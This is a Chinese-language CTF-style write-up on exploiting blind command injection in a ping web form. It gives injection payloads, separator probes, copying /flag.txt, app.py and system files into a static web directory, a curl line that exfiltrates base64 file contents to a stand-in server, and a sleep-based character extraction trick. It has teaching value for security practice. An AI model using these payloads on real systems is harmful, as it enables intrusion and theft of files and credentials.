命令注入漏洞利用（无回显场景）

 1. 漏洞确认与初始探测（现象驱动）

- 现象：正常提交 IP 地址后，页面只显示 ping 统计信息（如 `Packets Transmitted: 2...`），而非完整 ping 输出。  
- 推断：后端可能对命令输出进行了过滤，只提取特定格式的内容。  
- 探测：在参数后注入 `; sleep 5`，若响应延迟，则证明命令注入成功。  
- 试探边界：依次测试常见分隔符（`;`、`|`、`&`、`&&`、`||`、`\n`、`$()`、反引号等），记录哪些未被过滤，哪些触发“Invalid input”。  
- 初步结论：找到可用的命令分隔符（如 `;` 或换行符），并确认命令能够执行。

 2. 核心策略：从“回显”到“外带”

 2.1 直接回显尝试
优先尝试最简单的回显方式（如 `; cat /flag.txt`），若页面直接显示文件内容，则问题解决。  
若失败，则进入无回显场景。

 2.2 决策转向外带
思考：既然命令执行了但看不到结果，我需要让结果出现在我能访问的地方。  
常见外带途径：
- 写入 Web 可访问目录
- DNS/HTTP 请求外发数据
- 时间盲注逐字符猜解

选择优先级：  
写入 Web 目录 > DNS/HTTP 外带 > 时间盲注（效率由高到低）。

 3. 写入 Web 可访问目录（首选方案）

 3.1 原理
大多数 Web 应用有静态资源目录（如 `static/`、`uploads/`、`images/`），这些目录下的文件可通过 HTTP 直接访问。如果能将命令结果写入该目录，即可通过浏览器读取。

 3.2 关键决策点
- 重定向被过滤：若 `>` 被黑名单拦截，不能直接用 `>` 写入文件，但 `cp`、`dd`、`tee` 等命令不依赖重定向符号，同样能完成文件复制。  
- 验证写入权限：先复制一个已知存在的文件（如 `static/styles.css`）到 `static/test.css`，访问 `/static/test.css` 确认成功，再执行关键操作。

 3.3 利用链
1. 注入 `; cp /flag.txt static/flag.txt`  
2. 访问 `/static/flag.txt` 获取 flag

 4. 系统化信息收集（先于盲目尝试）

在不知道 flag 位置时，盲目猜测路径效率极低。应系统化收集环境信息：

- 读取应用源码：注入 `; cp app.py static/app.txt`，获取后端逻辑，了解过滤规则、输出解析方式。  
- 读取环境配置：`/etc/passwd`、`/proc/self/environ` 可了解用户和路径。  
- 查找 Dockerfile：若环境基于 Docker，Dockerfile 常包含 flag 写入位置（如 `RUN echo $FLAG > /FLAG.txt`），直接指明目标文件。  
- 列出目录：通过 `ls` 命令将目录列表写入静态文件，再读取。

决策逻辑：先收集信息，再针对性攻击，避免无谓试错。

 5. 备选外带方案

 5.1 DNS/HTTP 外带
当无法写入 Web 目录时，若目标可出网，可用 `curl` 或 `wget` 将数据发送到攻击者控制的服务器：  
`; curl http://your-server.com/$(cat /flag.txt | base64)`

 5.2 时间盲注
当既不能写文件也不能出网时，利用 `sleep` 逐字符判断：  
`; if [ $(cat /flag.txt | cut -c1) = 'f' ]; then sleep 5; fi`  
通过响应时间差异逐位提取 flag。此方法效率低，但通用性强。

 6. 验证与迭代

每一步操作前，先进行小范围验证：
- 确认分隔符可用 → 注入 `; sleep 1` 观察延迟。  
- 确认 `cp` 可用 → 复制已知文件到静态目录，访问验证。  
- 确认信息收集成功 → 访问静态文件，确认内容正确。  

原则：用最小代价验证可行性，再执行关键步骤，避免无效尝试。

 7. 总结：通用流程与思维要点

1. 确认注入：通过延时命令证明命令执行。  
2. 探测过滤：找出可用分隔符与命令。  
3. 优先外带：能写文件就写文件（Web 目录），不能则尝试 DNS/HTTP，最后盲注。  
4. 系统化收集：先读源码、Dockerfile 等，定位目标。  
5. 验证迭代：每一步小范围测试，确保可行。
